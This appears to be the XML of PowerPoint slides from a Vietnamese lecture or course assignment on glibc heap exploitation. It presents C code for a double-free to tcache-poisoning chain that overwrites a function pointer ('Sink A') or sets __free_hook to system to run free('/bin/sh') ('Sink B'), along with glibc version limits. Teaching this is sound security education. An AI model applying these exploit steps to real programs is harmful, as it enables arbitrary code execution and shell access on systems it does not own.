          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GLIBC ≥ 2.29</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9006840" y="4754880"/>
            <a:ext cx="2542032" cy="135331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free(h) lần 2 bị chặn ngay: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(): double free detected in tcache 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Sink A: ghi đè con trỏ hàm, không cần leak</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5.5 · DOUBLE FREE → UAF WRITE → TCACHE POISONING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6309360" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5943600" cy="457200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struct target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void (*action)(void);</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char  pad[BUFSIZE2 - sizeof(void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 cùng size 0x100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struct target *t = malloc(sizeof(struct target));</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t-&gt;action = safe;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char *i = malloc(BUFSIZE2), *h = malloc(BUFSIZE2);</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free(i); free(h);                /* h -&gt; i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char *j = malloc(BUFSIZE1);</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strncpy(j, argv[1], BUFSIZE1 - 1);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(h);                         /* h -&gt; h         */</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*(struct target **) h = t;       /* next = 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malloc(BUFSIZE2);                /* trả về h       */</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struct target *fake = malloc(BUFSIZE2); /* = t     */</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fake-&gt;action = win;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t-&gt;action();                     /* chạy win()     */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="1417320"/>
            <a:ext cx="4736592" cy="3246120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2254"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1572768"/>
            <a:ext cx="4389120" cy="22860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ENTRIES[14] QUA TỪNG BƯỚC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="1920240"/>
            <a:ext cx="4279392" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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[h] → h  (self-loop)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9363456" y="2304288"/>
            <a:ext cx="0" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="2468880"/>
            <a:ext cx="4279392" cy="384048"/>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UAF write: h-&gt;next = t</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9363456" y="2852928"/>
            <a:ext cx="0" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="3017520"/>
            <a:ext cx="4279392" cy="384048"/>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[h] → [t]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9363456" y="3401568"/>
            <a:ext cx="0" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="3566160"/>
            <a:ext cx="4279392" cy="384048"/>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malloc #1 = h · malloc #2 = t</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9363456" y="3950208"/>
            <a:ext cx="0" cy="164592"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="4114800"/>
            <a:ext cx="4279392" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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fake-&gt;action = win → t-&gt;action()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="4892040"/>
            <a:ext cx="4736592" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5517"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="5056632"/>
            <a:ext cx="4370832"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VÌ SAO KHÔNG CẦN LEAK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="5349240"/>
            <a:ext cx="4370832" cy="758952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t là biến local nằm sẵn trong tay chương trình: không cần địa chỉ tuyệt đối, không cần tắt ASLR.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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Sink B: __free_hook → system() để có shell</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5.5 · CẦN ĐỊA CHỈ TUYỆT ĐỐI CỦA LIBC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="6309360" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="5943600" cy="306324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extern void (*__free_hook) (void *, const void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 chỉ có ở glibc &lt; 2.34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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(h);                                 /* h -&gt; h  */</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*(void **) h = (void *) &amp;__free_hook;    /* poison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malloc(BUFSIZE2);                         /* = h     */</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void **hook_slot = (void **) malloc(BUFSIZE2);</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 = &amp;__free_hook */</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*hook_slot = (void *) system;</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free("/bin/sh");          /* = system("/bin/sh") */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4937760"/>
            <a:ext cx="6309360" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5102352"/>
            <a:ext cx="5943600"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VÌ SAO free("/bin/sh") KHÔNG CRASH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5394960"/>
            <a:ext cx="5943600" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__libc_free</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> kiểm tra hook trước </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mem2chunk</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; rdi chứa chuỗi và </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>system()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> chỉ đọc đối số đầu (ABI x86-64).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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995160" y="1417320"/>
          <a:ext cx="4736592" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1188720"/>
                <a:gridCol w="1554480"/>
                <a:gridCol w="1993392"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> </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Sink A</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Sink B</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mục tiêu</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con trỏ hàm của t</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__free_hook trong libc</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Cần leak</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Không</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libc base khi bật ASLR</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kết quả</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gọi win()</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system("/bin/sh")</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00" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Sai địa chỉ</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segfault hoặc unaligned tcache chunk</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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="3840480"/>
            <a:ext cx="4736592" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3077"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4005072"/>
            <a:ext cx="4370832" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GIỚI HẠN PHIÊN BẢN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4297680"/>
            <a:ext cx="4370832" cy="1810512"/>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Chỉ đi hết chuỗi trên glibc 2.26–2.28 (vd. </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ubuntu:18.04</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, glibc 2.27)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>≥ 2.29: free(h) lần 2 abort tại malloc.c:4201, không tới bước poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>≥ 2.34: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__free_hook</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> bị gỡ, linker báo undefined reference</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731520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kỹ thuật khai thác</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 5 · tcache poisoning, biến thể hiện đại, mối liên hệ lỗ hổng · CWE · CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
